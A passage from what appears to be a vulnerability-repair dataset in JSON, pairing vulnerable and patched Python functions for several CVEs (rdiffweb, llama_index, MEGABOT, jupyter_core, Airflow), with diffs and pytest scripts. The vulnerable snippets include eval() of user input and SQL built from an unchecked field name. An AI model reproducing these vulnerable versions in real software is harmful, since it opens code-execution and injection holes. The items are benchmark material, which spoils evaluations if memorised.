    "cve_description": "Improper Privilege Management in GitHub repository ikus060/rdiffweb prior to 2.5.2.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/ikus060/rdiffweb",
    "patch_url": [
      "https://github.com/ikus060/rdiffweb/commit/b2df3679564d0daa2856213bb307d3e34bd89a25"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_334_1",
        "commit": "979ab34",
        "file_path": "rdiffweb/core/librdiff.py",
        "start_line": 848,
        "end_line": 872,
        "snippet": "    def __init__(self, user_root, path, encoding):\n        if isinstance(user_root, str):\n            user_root = os.fsencode(user_root)\n        if isinstance(path, str):\n            path = os.fsencode(path)\n        assert isinstance(user_root, bytes)\n        assert isinstance(path, bytes)\n        assert encoding\n        self._encoding = encodings.search_function(encoding)\n        assert self._encoding\n        self.path = path.strip(b\"/\")\n        if self.path:\n            self.full_path = os.path.normpath(os.path.join(user_root, self.path))\n        else:\n            self.full_path = os.path.normpath(user_root)\n\n        # The location of rdiff-backup-data directory.\n        self._data_path = os.path.join(self.full_path, RDIFF_BACKUP_DATA)\n        assert isinstance(self._data_path, bytes)\n        self._increment_path = os.path.join(self._data_path, INCREMENTS)\n        self.current_mirror = MetadataDict(self, CurrentMirrorEntry)\n        self.error_log = MetadataDict(self, LogEntry)\n        self.mirror_metadata = MetadataDict(self, MirrorMetadataEntry)\n        self.file_statistics = MetadataDict(self, FileStatisticsEntry)\n        self.session_statistics = MetadataDict(self, SessionStatisticsEntry)"
      },
      {
        "id": "vul_py_334_2",
        "commit": "979ab34",
        "file_path": "rdiffweb/core/librdiff.py",
        "start_line": 1083,
        "end_line": 1096,
        "snippet": "    def get_display_name(self, path):\n        \"\"\"\n        Return proper display name of the given path according to repository encoding and quoted characters.\n        \"\"\"\n        assert isinstance(path, bytes)\n        path = path.strip(b'/')\n        if path in [b'.', b'']:\n            # For repository we use either path if defined or the directory base name\n            if not self.path:\n                return self._decode(unquote(os.path.basename(self.full_path)))\n            return self._decode(unquote(self.path))\n        else:\n            # For path, we use the dir name\n            return self._decode(unquote(os.path.basename(path)))"
      },
      {
        "id": "vul_py_334_3",
        "commit": "979ab34",
        "file_path": "rdiffweb/core/model/_repo.py",
        "start_line": 135,
        "end_line": 143,
        "snippet": "    def __init_on_load__(self):\n        RdiffRepo.__init__(\n            self, self.user.user_root, self.repopath, encoding=self.encoding or RepoObject.DEFAULT_REPO_ENCODING\n        )\n\n    @property\n    def displayname(self):\n        # Repository displayName is the \"repopath\" too.\n        return self.repopath.strip('/')"
      },
      {
        "id": "vul_py_334_4",
        "commit": "979ab34",
        "file_path": "rdiffweb/core/rdw_templating.py",
        "start_line": 159,
        "end_line": 191,
        "snippet": "def url_for(*args, **kwargs):\n    \"\"\"\n    Generate a url for the given endpoint, path (*args) with parameters (**kwargs)\n\n    This could be used to generate a path with userobject and repo object\n\n    \"\"\"\n    path = \"\"\n    for chunk in args:\n        if not chunk:\n            continue\n        if hasattr(chunk, 'owner') and hasattr(chunk, 'path'):\n            # This is a RepoObject\n            path += \"/\"\n            path += chunk.owner\n            path += \"/\"\n            path += rdw_helpers.quote_url(chunk.path.strip(b\"/\"))\n        elif hasattr(chunk, 'path'):\n            # This is a DirEntry\n            if chunk.path:\n                path += \"/\"\n                path += rdw_helpers.quote_url(chunk.path.strip(b\"/\"))\n        elif chunk and isinstance(chunk, bytes):\n            path += \"/\"\n            path += rdw_helpers.quote_url(chunk.strip(b\"/\"))\n        elif chunk and isinstance(chunk, str):\n            path += \"/\"\n            path += chunk.strip(\"/\")\n        else:\n            raise ValueError('invalid positional arguments, url_for accept str, bytes or RepoPath: %r' % chunk)\n    # Sort the arguments to have predictable results.\n    qs = [(k, v.epoch() if hasattr(v, 'epoch') else v) for k, v in sorted(kwargs.items()) if v is not None]\n    return cherrypy.url(path=path, qs=qs)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_334_1",
        "commit": "b2df3679564d0daa2856213bb307d3e34bd89a25",
        "file_path": "rdiffweb/core/librdiff.py",
        "start_line": 848,
        "end_line": 867,
        "snippet": "    def __init__(self, full_path, encoding):\n        assert encoding, 'encoding is required'\n        self._encoding = encodings.search_function(encoding)\n        assert self._encoding, 'encoding must be a valid charset'\n\n        # Validate and sanitize the full_path\n        assert full_path, 'full path is required'\n        self.full_path = os.fsencode(full_path) if isinstance(full_path, str) else full_path\n        assert os.path.isabs(self.full_path), 'full_path must be absolute path'\n        self.full_path = os.path.normpath(self.full_path)\n\n        # The location of rdiff-backup-data directory.\n        self._data_path = os.path.join(self.full_path, RDIFF_BACKUP_DATA)\n        assert isinstance(self._data_path, bytes)\n        self._increment_path = os.path.join(self._data_path, INCREMENTS)\n        self.current_mirror = MetadataDict(self, CurrentMirrorEntry)\n        self.error_log = MetadataDict(self, LogEntry)\n        self.mirror_metadata = MetadataDict(self, MirrorMetadataEntry)\n        self.file_statistics = MetadataDict(self, FileStatisticsEntry)\n        self.session_statistics = MetadataDict(self, SessionStatisticsEntry)"
      },
      {
        "id": "fix_py_334_2",
        "commit": "b2df3679564d0daa2856213bb307d3e34bd89a25",
        "file_path": "rdiffweb/core/librdiff.py",
        "start_line": 1078,
        "end_line": 1089,
        "snippet": "    def get_display_name(self, path):\n        \"\"\"\n        Return proper display name of the given path according to repository encoding and quoted characters.\n        \"\"\"\n        assert isinstance(path, bytes)\n        path = path.strip(b'/')\n        if path in [b'.', b'']:\n            # For repository the directory base name\n            return self._decode(unquote(os.path.basename(self.full_path)))\n        else:\n            # For path, we use the dir name\n            return self._decode(unquote(os.path.basename(path)))"
      },
      {
        "id": "fix_py_334_3",
        "commit": "b2df3679564d0daa2856213bb307d3e34bd89a25",
        "file_path": "rdiffweb/core/model/_repo.py",
        "start_line": 135,
        "end_line": 143,
        "snippet": "    def __init_on_load__(self):\n        # RdiffRepo required an absolute full path, When the user_root is invalid, let generate an invalid full path.\n        if not self.user.user_root:\n            full_path = os.path.join('/user_has_an_empty_user_root/', self.repopath.strip('/'))\n        elif not os.path.isabs(self.user.user_root):\n            full_path = os.path.join('/user_has_a_relative_user_root/', self.repopath.strip('/'))\n        else:\n            full_path = os.path.join(self.user.user_root, self.repopath.strip('/'))\n        RdiffRepo.__init__(self, full_path, encoding=self.encoding or RepoObject.DEFAULT_REPO_ENCODING)"
      },
      {
        "id": "fix_py_334_4",
        "commit": "b2df3679564d0daa2856213bb307d3e34bd89a25",
        "file_path": "rdiffweb/core/rdw_templating.py",
        "start_line": 159,
        "end_line": 191,
        "snippet": "def url_for(*args, **kwargs):\n    \"\"\"\n    Generate a url for the given endpoint, path (*args) with parameters (**kwargs)\n\n    This could be used to generate a path with userobject and repo object\n\n    \"\"\"\n    path = \"\"\n    for chunk in args:\n        if not chunk:\n            continue\n        if hasattr(chunk, 'owner') and hasattr(chunk, 'repopath'):\n            # This is a RepoObject\n            path += \"/\"\n            path += chunk.owner\n            path += \"/\"\n            path += rdw_helpers.quote_url(chunk.repopath.strip(\"/\"))\n        elif hasattr(chunk, 'path'):\n            # This is a DirEntry\n            if chunk.path:\n                path += \"/\"\n                path += rdw_helpers.quote_url(chunk.path.strip(b\"/\"))\n        elif chunk and isinstance(chunk, bytes):\n            path += \"/\"\n            path += rdw_helpers.quote_url(chunk.strip(b\"/\"))\n        elif chunk and isinstance(chunk, str):\n            path += \"/\"\n            path += chunk.strip(\"/\")\n        else:\n            raise ValueError('invalid positional arguments, url_for accept str, bytes or RepoPath: %r' % chunk)\n    # Sort the arguments to have predictable results.\n    qs = [(k, v.epoch() if hasattr(v, 'epoch') else v) for k, v in sorted(kwargs.items()) if v is not None]\n    return cherrypy.url(path=path, qs=qs)"
      }
    ],
    "vul_patch": "--- a/rdiffweb/core/librdiff.py\n+++ b/rdiffweb/core/librdiff.py\n@@ -1,18 +1,13 @@\n-    def __init__(self, user_root, path, encoding):\n-        if isinstance(user_root, str):\n-            user_root = os.fsencode(user_root)\n-        if isinstance(path, str):\n-            path = os.fsencode(path)\n-        assert isinstance(user_root, bytes)\n-        assert isinstance(path, bytes)\n-        assert encoding\n+    def __init__(self, full_path, encoding):\n+        assert encoding, 'encoding is required'\n         self._encoding = encodings.search_function(encoding)\n-        assert self._encoding\n-        self.path = path.strip(b\"/\")\n-        if self.path:\n-            self.full_path = os.path.normpath(os.path.join(user_root, self.path))\n-        else:\n-            self.full_path = os.path.normpath(user_root)\n+        assert self._encoding, 'encoding must be a valid charset'\n+\n+        # Validate and sanitize the full_path\n+        assert full_path, 'full path is required'\n+        self.full_path = os.fsencode(full_path) if isinstance(full_path, str) else full_path\n+        assert os.path.isabs(self.full_path), 'full_path must be absolute path'\n+        self.full_path = os.path.normpath(self.full_path)\n \n         # The location of rdiff-backup-data directory.\n         self._data_path = os.path.join(self.full_path, RDIFF_BACKUP_DATA)\n\n--- a/rdiffweb/core/librdiff.py\n+++ b/rdiffweb/core/librdiff.py\n@@ -5,10 +5,8 @@\n         assert isinstance(path, bytes)\n         path = path.strip(b'/')\n         if path in [b'.', b'']:\n-            # For repository we use either path if defined or the directory base name\n-            if not self.path:\n-                return self._decode(unquote(os.path.basename(self.full_path)))\n-            return self._decode(unquote(self.path))\n+            # For repository the directory base name\n+            return self._decode(unquote(os.path.basename(self.full_path)))\n         else:\n             # For path, we use the dir name\n             return self._decode(unquote(os.path.basename(path)))\n\n--- a/rdiffweb/core/model/_repo.py\n+++ b/rdiffweb/core/model/_repo.py\n@@ -1,9 +1,9 @@\n     def __init_on_load__(self):\n-        RdiffRepo.__init__(\n-            self, self.user.user_root, self.repopath, encoding=self.encoding or RepoObject.DEFAULT_REPO_ENCODING\n-        )\n-\n-    @property\n-    def displayname(self):\n-        # Repository displayName is the \"repopath\" too.\n-        return self.repopath.strip('/')\n+        # RdiffRepo required an absolute full path, When the user_root is invalid, let generate an invalid full path.\n+        if not self.user.user_root:\n+            full_path = os.path.join('/user_has_an_empty_user_root/', self.repopath.strip('/'))\n+        elif not os.path.isabs(self.user.user_root):\n+            full_path = os.path.join('/user_has_a_relative_user_root/', self.repopath.strip('/'))\n+        else:\n+            full_path = os.path.join(self.user.user_root, self.repopath.strip('/'))\n+        RdiffRepo.__init__(self, full_path, encoding=self.encoding or RepoObject.DEFAULT_REPO_ENCODING)\n\n--- a/rdiffweb/core/rdw_templating.py\n+++ b/rdiffweb/core/rdw_templating.py\n@@ -9,12 +9,12 @@\n     for chunk in args:\n         if not chunk:\n             continue\n-        if hasattr(chunk, 'owner') and hasattr(chunk, 'path'):\n+        if hasattr(chunk, 'owner') and hasattr(chunk, 'repopath'):\n             # This is a RepoObject\n             path += \"/\"\n             path += chunk.owner\n             path += \"/\"\n-            path += rdw_helpers.quote_url(chunk.path.strip(b\"/\"))\n+            path += rdw_helpers.quote_url(chunk.repopath.strip(\"/\"))\n         elif hasattr(chunk, 'path'):\n             # This is a DirEntry\n             if chunk.path:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-12704",
    "cve_description": "A vulnerability in the LangChainLLM class of the run-llama/llama_index repository, version v0.12.5, allows for a Denial of Service (DoS) attack. The stream_complete method executes the llm using a thread and retrieves the result via the get_response_gen method of the StreamingGeneratorCallbackHandler class. If the thread terminates abnormally before the _llm.predict is executed, there is no exception handling for this case, leading to an infinite loop in the get_response_gen function. This can be triggered by providing an input of an incorrect type, causing the thread to terminate and the process to continue running indefinitely.",
    "cwe_info": {
      "CWE-755": {
        "name": "Improper Handling of Exceptional Conditions",
        "description": "The product does not handle or incorrectly handles an exceptional condition."
      }
    },
    "repo": "https://github.com/run-llama/llama_index",
    "patch_url": [
      "https://github.com/run-llama/llama_index/commit/d1ecfb77578d089cbe66728f18f635c09aa32a05"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_431_1",
        "commit": "98fd497",
        "file_path": "llama-index-core/llama_index/core/langchain_helpers/streaming.py",
        "start_line": 38,
        "end_line": 44,
        "snippet": "    def get_response_gen(self) -> Generator:\n        while True:\n            if not self._token_queue.empty():\n                token = self._token_queue.get_nowait()\n                yield token\n            elif self._done.is_set():\n                break"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_431_1",
        "commit": "d1ecfb77578d089cbe66728f18f635c09aa32a05",
        "file_path": "llama-index-core/llama_index/core/langchain_helpers/streaming.py",
        "start_line": 39,
        "end_line": 60,
        "snippet": "    def get_response_gen(self, timeout: float = 120.0) -> Generator:\n        \"\"\"Get response generator with timeout.\n\n        Args:\n            timeout (float): Maximum time in seconds to wait for the complete response.\n                            Defaults to 120 seconds.\n        \"\"\"\n        start_time = time.time()\n        while True:\n            if time.time() - start_time > timeout:\n                raise TimeoutError(\n                    f\"Response generation timed out after {timeout} seconds\"\n                )\n\n            if not self._token_queue.empty():\n                token = self._token_queue.get_nowait()\n                yield token\n            elif self._done.is_set():\n                break\n            else:\n                # Small sleep to prevent CPU spinning\n                time.sleep(0.01)"
      }
    ],
    "vul_patch": "--- a/llama-index-core/llama_index/core/langchain_helpers/streaming.py\n+++ b/llama-index-core/llama_index/core/langchain_helpers/streaming.py\n@@ -1,7 +1,22 @@\n-    def get_response_gen(self) -> Generator:\n+    def get_response_gen(self, timeout: float = 120.0) -> Generator:\n+        \"\"\"Get response generator with timeout.\n+\n+        Args:\n+            timeout (float): Maximum time in seconds to wait for the complete response.\n+                            Defaults to 120 seconds.\n+        \"\"\"\n+        start_time = time.time()\n         while True:\n+            if time.time() - start_time > timeout:\n+                raise TimeoutError(\n+                    f\"Response generation timed out after {timeout} seconds\"\n+                )\n+\n             if not self._token_queue.empty():\n                 token = self._token_queue.get_nowait()\n                 yield token\n             elif self._done.is_set():\n                 break\n+            else:\n+                # Small sleep to prevent CPU spinning\n+                time.sleep(0.01)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-43404",
    "cve_description": "MEGABOT is a fully customized Discord bot for learning and fun. The `/math` command and functionality of MEGABOT versions < 1.5.0 contains a remote code execution vulnerability due to a Python `eval()`. The vulnerability allows an attacker to inject Python code into the `expression` parameter when using `/math` in any Discord channel. This vulnerability impacts any discord guild utilizing MEGABOT. This vulnerability was fixed in  release version 1.5.0.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      }
    },
    "repo": "https://github.com/NicPWNs/MEGABOT",
    "patch_url": [
      "https://github.com/NicPWNs/MEGABOT/commit/71e79e5581ea36313700385b112d863053fb7ed6"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_129_1",
        "commit": "9d2873c",
        "file_path": "commands/math.py",
        "start_line": 5,
        "end_line": 14,
        "snippet": "async def math(ctx, expression):\n\n    try:\n        response = str(eval(expression))\n    except:\n        response = \"Invalid Expression!\"\n\n    embed = discord.Embed(color=0x5B8F3C, title=\"\\ud83e\\uddee  Math\", description=response)\n\n    await ctx.respond(embed=embed)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_129_1",
        "commit": "71e79e5",
        "file_path": "commands/math.py",
        "start_line": 6,
        "end_line": 35,
        "snippet": "async def math(ctx, expression):\n\n    try:\n        tree = ast.parse(expression, mode=\"eval\")\n    except SyntaxError:\n        result = \"Not a valid Python expression!\"\n        embed = discord.Embed(color=0x5B8F3C, title=\"\\ud83e\\uddee  Math\", description=result)\n        await ctx.respond(embed=embed)\n\n    if not all(\n        isinstance(\n            node,\n            (\n                ast.Expression,\n                ast.UnaryOp,\n                ast.unaryop,\n                ast.BinOp,\n                ast.operator,\n                ast.Constant,\n            ),\n        )\n        for node in ast.walk(tree)\n    ):\n        result = \"Not a valid mathematical expression!\"\n        embed = discord.Embed(color=0x5B8F3C, title=\"\\ud83e\\uddee  Math\", description=result)\n        await ctx.respond(embed=embed)\n    else:\n        result = eval(compile(tree, filename=\"\", mode=\"eval\"))\n        embed = discord.Embed(color=0x5B8F3C, title=\"\\ud83e\\uddee  Math\", description=result)\n        await ctx.respond(embed=embed)"
      }
    ],
    "vul_patch": "--- a/commands/math.py\n+++ b/commands/math.py\n@@ -1,10 +1,30 @@\n async def math(ctx, expression):\n \n     try:\n-        response = str(eval(expression))\n-    except:\n-        response = \"Invalid Expression!\"\n+        tree = ast.parse(expression, mode=\"eval\")\n+    except SyntaxError:\n+        result = \"Not a valid Python expression!\"\n+        embed = discord.Embed(color=0x5B8F3C, title=\"\\ud83e\\uddee  Math\", description=result)\n+        await ctx.respond(embed=embed)\n \n-    embed = discord.Embed(color=0x5B8F3C, title=\"\\ud83e\\uddee  Math\", description=response)\n-\n-    await ctx.respond(embed=embed)\n+    if not all(\n+        isinstance(\n+            node,\n+            (\n+                ast.Expression,\n+                ast.UnaryOp,\n+                ast.unaryop,\n+                ast.BinOp,\n+                ast.operator,\n+                ast.Constant,\n+            ),\n+        )\n+        for node in ast.walk(tree)\n+    ):\n+        result = \"Not a valid mathematical expression!\"\n+        embed = discord.Embed(color=0x5B8F3C, title=\"\\ud83e\\uddee  Math\", description=result)\n+        await ctx.respond(embed=embed)\n+    else:\n+        result = eval(compile(tree, filename=\"\", mode=\"eval\"))\n+        embed = discord.Embed(color=0x5B8F3C, title=\"\\ud83e\\uddee  Math\", description=result)\n+        await ctx.respond(embed=embed)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-36631",
    "cve_description": "A vulnerability was found in barronwaffles dwc_network_server_emulator. It has been declared as critical. This vulnerability affects the function update_profile of the file gamespy/gs_database.py. The manipulation of the argument firstname/lastname leads to sql injection. The attack can be initiated remotely. The name of the patch is f70eb21394f75019886fbc2fb536de36161ba422. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-216772.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/barronwaffles/dwc_network_server_emulator",
    "patch_url": [
      "https://github.com/barronwaffles/dwc_network_server_emulator/commit/f70eb21394f75019886fbc2fb536de36161ba422"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_144_1",
        "commit": "78ea738",
        "file_path": "gamespy/gs_database.py",
        "start_line": 365,
        "end_line": 375,
        "snippet": "    def update_profile(self, profileid, field):\n        \"\"\"Found profile id associated with session key.\n\n        Start replacing each field one by one.\n        TODO: Optimize this so it's done all in one update.\n        FIXME: Possible security issue due to embedding an unsanitized\n        string directly into the statement.\n        \"\"\"\n        with Transaction(self.conn) as tx:\n            q = \"UPDATE users SET \\\"%s\\\" = ? WHERE profileid = ?\"\n            tx.nonquery(q % field[0], (field[1], profileid))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_144_1",
        "commit": "f70eb21",
        "file_path": "gamespy/gs_database.py",
        "start_line": 365,
        "end_line": 375,
        "snippet": "    def update_profile(self, profileid, field):\n        \"\"\"Found profile id associated with session key.\n\n        Start replacing each field one by one.\n        TODO: Optimize this so it's done all in one update.\n        TODO: Check if other values than firstname/lastname are set using this\n        \"\"\"\n        if field[0] in [\"firstname\", \"lastname\"]:\n            with Transaction(self.conn) as tx:\n                q = \"UPDATE users SET \\\"%s\\\" = ? WHERE profileid = ?\"\n                tx.nonquery(q % field[0], (field[1], profileid))"
      }
    ],
    "vul_patch": "--- a/gamespy/gs_database.py\n+++ b/gamespy/gs_database.py\n@@ -3,9 +3,9 @@\n \n         Start replacing each field one by one.\n         TODO: Optimize this so it's done all in one update.\n-        FIXME: Possible security issue due to embedding an unsanitized\n-        string directly into the statement.\n+        TODO: Check if other values than firstname/lastname are set using this\n         \"\"\"\n-        with Transaction(self.conn) as tx:\n-            q = \"UPDATE users SET \\\"%s\\\" = ? WHERE profileid = ?\"\n-            tx.nonquery(q % field[0], (field[1], profileid))\n+        if field[0] in [\"firstname\", \"lastname\"]:\n+            with Transaction(self.conn) as tx:\n+                q = \"UPDATE users SET \\\"%s\\\" = ? WHERE profileid = ?\"\n+                tx.nonquery(q % field[0], (field[1], profileid))\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-39286",
    "cve_description": "Jupyter Core is a package for the core common functionality of Jupyter projects. Jupyter Core prior to version 4.11.2 contains an arbitrary code execution vulnerability in `jupyter_core` that stems from `jupyter_core` executing untrusted files in CWD. This vulnerability allows one user to run code as another. Version 4.11.2 contains a patch for this issue. There are no known workarounds.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/jupyter/jupyter_core",
    "patch_url": [
      "https://github.com/jupyter/jupyter_core/commit/1118c8ce01800cb689d51f655f5ccef19516e283"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_45_1",
        "commit": "d3f61f3",
        "file_path": "jupyter_core/application.py",
        "start_line": 88,
        "end_line": 93,
        "snippet": "    def config_file_paths(self):\n        path = jupyter_config_path()\n        if self.config_dir not in path:\n            path.insert(0, self.config_dir)\n        path.insert(0, os.getcwd())\n        return path"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_45_1",
        "commit": "1118c8ce01800cb689d51f655f5ccef19516e283",
        "file_path": "jupyter_core/application.py",
        "start_line": 88,
        "end_line": 93,
        "snippet": "    def config_file_paths(self):\n        path = jupyter_config_path()\n        if self.config_dir not in path:\n            # Insert config dir as first item.\n            path.insert(0, self.config_dir)\n        return path"
      }
    ],
    "vul_patch": "--- a/jupyter_core/application.py\n+++ b/jupyter_core/application.py\n@@ -1,6 +1,6 @@\n     def config_file_paths(self):\n         path = jupyter_config_path()\n         if self.config_dir not in path:\n+            # Insert config dir as first item.\n             path.insert(0, self.config_dir)\n-        path.insert(0, os.getcwd())\n         return path\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-39286:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/jupyter_core\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-39286/bin/python -m pytest jupyter_core/tests/test_application.py::test_load_config jupyter_core/tests/test_application.py::test_load_config_no_cwd jupyter_core/tests/test_application.py::test_load_bad_config -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-39286:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/jupyter_core\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-39286/bin/python -m pytest jupyter_core/tests/test_application.py -k \"not test_load_config\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2020-17526",
    "cve_description": "Incorrect Session Validation in Apache Airflow Webserver versions prior to 1.10.14 with default config allows a malicious airflow user on site A where they log in normally, to access unauthorized Airflow Webserver on Site B through the session from Site A. This does not affect users who have changed the default value for `[webserver] secret_key` config.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/a8900fa5f2b8963e9f57ba4ae5520a5d339aeaad",
      "https://github.com/apache/airflow/commit/fe6d00a54f83468e296777d3b83b65a2ae7169ec",
      "https://github.com/apache/airflow/commit/6b065840323f9a4fc8e372b458d26e419e4fa99b",
      "https://github.com/apache/airflow/commit/2f3b1c780472afd4c8a93633e6633feb7083792e",
      "https://github.com/apache/airflow/commit/97b2735d65e95c4633966667b6db3908540f3937",
      "https://github.com/apache/airflow/commit/9e01476a50b9be27c4b1e6c6e24d36f290629195",
      "https://github.com/apache/airflow/commit/dfa7b26ddaca80ee8fd9915ee9f6eac50fac77f6"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_89_1",
        "commit": "2f3b1c7",
        "file_path": "airflow/www_rbac/app.py",
        "start_line": "50",
        "end_line": "280",
        "snippet": "def create_app(config=None, session=None, testing=False, app_name=\"Airflow\"):\n    global app, appbuilder\n    app = Flask(__name__)\n    if conf.getboolean('webserver', 'ENABLE_PROXY_FIX'):\n        app.wsgi_app = ProxyFix(\n            app.wsgi_app,\n            num_proxies=conf.get(\"webserver\", \"PROXY_FIX_NUM_PROXIES\", fallback=None),\n            x_for=conf.getint(\"webserver\", \"PROXY_FIX_X_FOR\", fallback=1),\n            x_proto=conf.getint(\"webserver\", \"PROXY_FIX_X_PROTO\", fallback=1),\n            x_host=conf.getint(\"webserver\", \"PROXY_FIX_X_HOST\", fallback=1),\n            x_port=conf.getint(\"webserver\", \"PROXY_FIX_X_PORT\", fallback=1),\n            x_prefix=conf.getint(\"webserver\", \"PROXY_FIX_X_PREFIX\", fallback=1)\n        )\n    app.secret_key = conf.get('webserver', 'SECRET_KEY')\n    app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=settings.get_session_lifetime_config())\n\n    app.config.from_pyfile(settings.WEBSERVER_CONFIG, silent=True)\n    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n    app.config['APP_NAME'] = app_name\n    app.config['TESTING'] = testing\n\n    app.config['SESSION_COOKIE_HTTPONLY'] = True\n    app.config['SESSION_COOKIE_SECURE'] = conf.getboolean('webserver', 'COOKIE_SECURE')\n    app.config['SESSION_COOKIE_SAMESITE'] = conf.get('webserver', 'COOKIE_SAMESITE')\n\n    if config:\n        app.config.from_mapping(config)\n\n    if 'SQLALCHEMY_ENGINE_OPTIONS' not in app.config:\n        app.config['SQLALCHEMY_ENGINE_OPTIONS'] = settings.prepare_engine_args()\n\n    csrf.init_app(app)\n\n    db = SQLA(app)\n\n    from airflow import api\n    api.load_auth()\n    api.API_AUTH.api_auth.init_app(app)\n\n    # flake8: noqa: F841\n    cache = Cache(app=app, config={'CACHE_TYPE': 'filesystem', 'CACHE_DIR': '/tmp'})\n\n    from airflow.www_rbac.blueprints import routes\n    app.register_blueprint(routes)\n\n    configure_logging()\n    configure_manifest_files(app)\n\n    with app.app_context():\n        from airflow.www_rbac.security import AirflowSecurityManager\n        security_manager_class = app.config.get('SECURITY_MANAGER_CLASS') or \\\n            AirflowSecurityManager\n\n        if not issubclass(security_manager_class, AirflowSecurityManager):\n            raise Exception(\n                \"\"\"Your CUSTOM_SECURITY_MANAGER must now extend AirflowSecurityManager,\n                 not FAB's security manager.\"\"\")\n\n        appbuilder = AppBuilder(\n            app,\n            db.session if not session else session,\n            security_manager_class=security_manager_class,\n            base_template='airflow/master.html',\n            update_perms=conf.getboolean('webserver', 'UPDATE_FAB_PERMS'))\n\n        def init_views(appbuilder):\n            from airflow.www_rbac import views\n            # Remove the session from scoped_session registry to avoid\n            # reusing a session with a disconnected connection\n            appbuilder.session.remove()\n            appbuilder.add_view_no_menu(views.Airflow())\n            appbuilder.add_view_no_menu(views.DagModelView())\n            appbuilder.add_view(views.DagRunModelView,\n                                \"DAG Runs\",\n                                category=\"Browse\",\n                                category_icon=\"fa-globe\")\n            appbuilder.add_view(views.JobModelView,\n                                \"Jobs\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.LogModelView,\n                                \"Logs\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.SlaMissModelView,\n                                \"SLA Misses\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.TaskInstanceModelView,\n                                \"Task Instances\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.TaskRescheduleModelView,\n                                \"Task Reschedules\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.ConfigurationView,\n                                \"Configurations\",\n                                category=\"Admin\",\n                                category_icon=\"fa-user\")\n            appbuilder.add_view(views.ConnectionModelView,\n                                \"Connections\",\n                                category=\"Admin\")\n            appbuilder.add_view(views.PoolModelView,\n                                \"Pools\",\n                                category=\"Admin\")\n            appbuilder.add_view(views.VariableModelView,\n                                \"Variables\",\n                                category=\"Admin\")\n            appbuilder.add_view(views.XComModelView,\n                                \"XComs\",\n                                category=\"Admin\")\n\n            if \"dev\" in version.version:\n                airflow_doc_site = \"https://airflow.readthedocs.io/en/latest\"\n            else:\n                airflow_doc_site = 